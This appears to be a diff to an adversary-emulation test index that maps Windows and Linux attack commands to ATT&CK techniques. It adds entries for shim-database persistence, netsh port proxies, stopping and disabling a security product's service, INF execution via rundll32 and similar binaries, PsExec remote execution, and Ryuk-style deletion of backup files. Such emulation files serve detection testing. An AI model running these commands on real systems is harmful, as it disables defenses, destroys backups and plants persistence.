@@ -724,6 +724,36 @@ persistence:
         command: |
           sdbinst.exe #{file_path}
           sdbinst.exe -u #{file_path}
+    - name: New shim database files created in the default shim database directory
+      description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          Copy-Item $PathToAtomicsFolder\T1138\bin\T1138CompatDatabase.sdb C:\Windows\apppatch\Custom\T1138CompatDatabase.sdb
+          Copy-Item $PathToAtomicsFolder\T1138\bin\T1138CompatDatabase.sdb C:\Windows\apppatch\Custom\Custom64\T1138CompatDatabase.sdb
+        cleanup_command: |
+          Remove-Item C:\Windows\apppatch\Custom\T1138CompatDatabase.sdb
+          Remove-Item C:\Windows\apppatch\Custom\Custom64\T1138CompatDatabase.sdb
+    - name: Registry key creation and/or modification events for SDB
+      description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1138" -Value "AtomicRedTeamT1138"
+          New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1138" -Value "AtomicRedTeamT1138"
+        cleanup_command: |
+          Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1138"
+          Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1138"
   T1197:
     technique:
       x_mitre_data_sources:
@@ -2862,7 +2892,7 @@ persistence:
         command: |
           sc config Fax binPath= "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \"write-host 'T1031 Test'\""
           sc start Fax
-          sc config Fax binPath= "C:\WINDOWS\system32\fxssvc.exe"
+        cleanup_command: sc config Fax binPath= "C:\WINDOWS\system32\fxssvc.exe"
   T1128:
     technique:
       x_mitre_data_sources:
@@ -5893,9 +5923,39 @@ defense-evasion:
         command: 'export #{proxy_scheme}_proxy=#{proxy_server}
 
 '
-        cleanup_command: |-
+        cleanup_command: |
           unset http_proxy
           unset https_proxy
+    - name: portproxy reg key
+      description: |
+        Adds a registry key to set up a proxy on the endpoint at
+        HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4
+      supported_platforms:
+      - windows
+      input_arguments:
+        listenport:
+          description: Specifies the IPv4 port, by port number or service name, on
+            which to listen.
+          type: string
+          default: 1337
+        connectport:
+          description: Specifies the IPv4 port, by port number or service name, to
+            which to connect. If connectport is not specified, the default is the
+            value of listenport on the local computer.
+          type: string
+          default: 1337
+        connectaddress:
+          description: Specifies the IPv4 address to which to connect. Acceptable
+            values are IP address, computer NetBIOS name, or computer DNS name. If
+            an address is not specified, the default is the local computer.
+          type: string
+          default: 127.0.0.1
+      executor:
+        name: powershell
+        elevation_required: true
+        command: netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport}
+          connectaddress=#{connectaddress}
+        cleanup_command: netsh interface portproxy delete v4tov4 listenport=#{listenport}
   T1196:
     technique:
       x_mitre_permissions_required:
@@ -6511,8 +6571,29 @@ defense-evasion:
           -Recurse
 
 '
-        cleanup_command: New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
+        cleanup_command: 'New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
           -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
+
+'
+    - name: Disable Arbitrary Security Windows Service
+      description: "With administrative rights, an adversary can disable Windows Services
+        related to security products. \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        service_name:
+          description: The name of the service to stop
+          type: String
+          default: McAfeeDLPAgentService
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          net.exe stop #{service_name}
+          sc.exe config #{service_name} start= disabled
+        cleanup_command: |-
+          sc.exe config #{service_name} start= auto
+          net.exe start #{service_name}
   T1107:
     technique:
       x_mitre_data_sources:
@@ -8588,7 +8669,7 @@ defense-evasion:
         outputfile:
           description: path of file to execute
           type: path
-          default: ($env:SystemRoot + "\Temp\scvhost.exe")
+          default: ($env:TEMP + "\svchost.exe")
       executor:
         name: powershell
         elevation_required: false
@@ -8614,7 +8695,7 @@ defense-evasion:
         outputfile:
           description: path of file to execute
           type: path
-          default: ($env:SystemRoot + "\Temp\scvhost.exe")
+          default: ($env:TEMP + "\svchost.exe")
       executor:
         name: powershell
         elevation_required: false
@@ -10109,6 +10190,80 @@ defense-evasion:
         command: 'rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
 
 '
+    - name: Rundll32 advpack.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with advpack.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+
+'
+    - name: Rundll32 ieadvpack.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with ieadvpack.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+
+'
+    - name: Rundll32 syssetup.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with syssetup.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall
+          128 .\#{inf_to_execute}
+
+'
+    - name: Rundll32 setupapi.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with setupapi.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128
+          .\#{inf_to_execute}
+
+'
   T1064:
     technique:
       x_mitre_permissions_required:
@@ -10351,8 +10506,9 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
       executor:
         name: command_prompt
-        command: "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}
-          \n"
+        command: 'C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}
+
+'
     - name: Msiexec.exe - Execute Local MSI file
       description: 'Execute arbitrary MSI file. Commonly seen in application installation.
 
@@ -10366,7 +10522,9 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218\src\Win32\T1218.msi
       executor:
         name: command_prompt
-        command: "msiexec.exe /q /i \"#{msi_payload}\" \n"
+        command: 'msiexec.exe /q /i "#{msi_payload}"
+
+'
     - name: Msiexec.exe - Execute Remote MSI file
       description: 'Execute arbitrary MSI file retrieved remotely. Less commonly seen
         in application installation, commonly seen in malware execution.
@@ -10381,7 +10539,9 @@ defense-evasion:
           default: http://site.com/file.msi
       executor:
         name: command_prompt
-        command: "msiexec.exe /q /i \"#{msi_payload}\" \n"
+        command: 'msiexec.exe /q /i "#{msi_payload}"
+
+'
     - name: Msiexec.exe - Execute Arbitrary DLL
       description: 'Execute arbitrary DLL file stored locally. Commonly seen in application
         installation.
@@ -10396,7 +10556,9 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
       executor:
         name: command_prompt
-        command: "msiexec.exe /y \"#{dll_payload}\" \n"
+        command: 'msiexec.exe /y "#{dll_payload}"
+
+'
     - name: Odbcconf.exe - Execute Arbitrary DLL
       description: 'Execute arbitrary DLL file stored locally.
 
@@ -10411,6 +10573,24 @@ defense-evasion:
       executor:
         name: command_prompt
         command: 'odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
+
+'
+    - name: InfDefaultInstall.exe .inf Execution
+      description: |
+        Test execution of a .inf using InfDefaultInstall.exe
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'InfDefaultInstall.exe #{inf_to_execute}
 
 '
   T1216:
@@ -11774,6 +11954,36 @@ privilege-escalation:
         command: |
           sdbinst.exe #{file_path}
           sdbinst.exe -u #{file_path}
+    - name: New shim database files created in the default shim database directory
+      description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          Copy-Item $PathToAtomicsFolder\T1138\bin\T1138CompatDatabase.sdb C:\Windows\apppatch\Custom\T1138CompatDatabase.sdb
+          Copy-Item $PathToAtomicsFolder\T1138\bin\T1138CompatDatabase.sdb C:\Windows\apppatch\Custom\Custom64\T1138CompatDatabase.sdb
+        cleanup_command: |
+          Remove-Item C:\Windows\apppatch\Custom\T1138CompatDatabase.sdb
+          Remove-Item C:\Windows\apppatch\Custom\Custom64\T1138CompatDatabase.sdb
+    - name: Registry key creation and/or modification events for SDB
+      description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1138" -Value "AtomicRedTeamT1138"
+          New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1138" -Value "AtomicRedTeamT1138"
+        cleanup_command: |
+          Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1138"
+          Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1138"
   T1088:
     technique:
       x_mitre_data_sources:
@@ -13731,7 +13941,19 @@ impact:
           default: "/var/log/syslog"
       executor:
         name: bash
-        command: dd of=#{file_to_overwrite} if=#{overwrite_source}
+        command: 'dd of=#{file_to_overwrite} if=#{overwrite_source}
+
+'
+    - name: Windows - Delete Backup Files
+      description: 'Deletes backup files in a manner similar to Ryuk ransomware.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        command: del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.*
+          c:\backup*.* c:\*.set c:\*.win c:\*.dsk
   '':
     technique:
       x_mitre_data_sources:
@@ -14065,6 +14287,9 @@ impact:
         command: 'sc.exe stop #{service_name}
 
 '
+        cleanup_command: 'sc.exe start #{service_name}
+
+'
     - name: Windows - Stop service using net.exe
       description: 'Stops a specified service using the net.exe command.
 
@@ -14082,6 +14307,9 @@ impact:
         command: 'net.exe stop #{service_name}
 
 '
+        cleanup_command: 'net.exe start #{service_name}
+
+'
     - name: Windows - Stop service by killing process
       description: "Stops a specified service killng the service's process. \nThis
         technique was used by WannaCry.\n"
@@ -14091,7 +14319,7 @@ impact:
         process_name:
           description: Name of a process to kill
           type: String
-          default: sqlwriter.exe
+          default: spoolsv.exe
       executor:
         name: command_prompt
         elevation_required: false
@@ -20207,6 +20435,80 @@ execution:
         command: 'rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
 
 '
+    - name: Rundll32 advpack.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with advpack.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+
+'
+    - name: Rundll32 ieadvpack.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with ieadvpack.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+
+'
+    - name: Rundll32 syssetup.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with syssetup.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall
+          128 .\#{inf_to_execute}
+
+'
+    - name: Rundll32 setupapi.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with setupapi.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128
+          .\#{inf_to_execute}
+
+'
   T1053:
     technique:
       x_mitre_permissions_required:
@@ -20669,8 +20971,9 @@ execution:
           default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
       executor:
         name: command_prompt
-        command: "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}
-          \n"
+        command: 'C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}
+
+'
     - name: Msiexec.exe - Execute Local MSI file
       description: 'Execute arbitrary MSI file. Commonly seen in application installation.
 
@@ -20684,7 +20987,9 @@ execution:
           default: PathToAtomicsFolder\T1218\src\Win32\T1218.msi
       executor:
         name: command_prompt
-        command: "msiexec.exe /q /i \"#{msi_payload}\" \n"
+        command: 'msiexec.exe /q /i "#{msi_payload}"
+
+'
     - name: Msiexec.exe - Execute Remote MSI file
       description: 'Execute arbitrary MSI file retrieved remotely. Less commonly seen
         in application installation, commonly seen in malware execution.
@@ -20699,7 +21004,9 @@ execution:
           default: http://site.com/file.msi
       executor:
         name: command_prompt
-        command: "msiexec.exe /q /i \"#{msi_payload}\" \n"
+        command: 'msiexec.exe /q /i "#{msi_payload}"
+
+'
     - name: Msiexec.exe - Execute Arbitrary DLL
       description: 'Execute arbitrary DLL file stored locally. Commonly seen in application
         installation.
@@ -20714,7 +21021,9 @@ execution:
           default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
       executor:
         name: command_prompt
-        command: "msiexec.exe /y \"#{dll_payload}\" \n"
+        command: 'msiexec.exe /y "#{dll_payload}"
+
+'
     - name: Odbcconf.exe - Execute Arbitrary DLL
       description: 'Execute arbitrary DLL file stored locally.
 
@@ -20729,6 +21038,24 @@ execution:
       executor:
         name: command_prompt
         command: 'odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
+
+'
+    - name: InfDefaultInstall.exe .inf Execution
+      description: |
+        Test execution of a .inf using InfDefaultInstall.exe
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'InfDefaultInstall.exe #{inf_to_execute}
 
 '
   T1216:
@@ -22575,6 +22902,28 @@ lateral-movement:
         command: 'New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}
 
 '
+    - name: Copy and Execute File with PsExec
+      description: 'Copies a file to a remote host and executes it using PsExec. Requires
+        the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_host:
+          description: Remote computer to receive the copy and execute the file
+          type: String
+          default: "\\\\localhost"
+        command_path:
+          description: File to copy and execute
+          type: Path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: 'psexec.exe #{remote_host} -c #{command_path}
+
+'
   T1028:
     technique:
       x_mitre_data_sources:
@@ -24123,9 +24472,39 @@ command-and-control:
         command: 'export #{proxy_scheme}_proxy=#{proxy_server}
 
 '
-        cleanup_command: |-
+        cleanup_command: |
           unset http_proxy
           unset https_proxy
+    - name: portproxy reg key
+      description: |
+        Adds a registry key to set up a proxy on the endpoint at
+        HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4
+      supported_platforms:
+      - windows
+      input_arguments:
+        listenport:
+          description: Specifies the IPv4 port, by port number or service name, on
+            which to listen.
+          type: string
+          default: 1337
+        connectport:
+          description: Specifies the IPv4 port, by port number or service name, to
+            which to connect. If connectport is not specified, the default is the
+            value of listenport on the local computer.
+          type: string
+          default: 1337
+        connectaddress:
+          description: Specifies the IPv4 address to which to connect. Acceptable
+            values are IP address, computer NetBIOS name, or computer DNS name. If
+            an address is not specified, the default is the local computer.
+          type: string
+          default: 127.0.0.1
+      executor:
+        name: powershell
+        elevation_required: true
+        command: netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport}
+          connectaddress=#{connectaddress}
+        cleanup_command: netsh interface portproxy delete v4tov4 listenport=#{listenport}
   T1132:
     technique:
       x_mitre_data_sources:
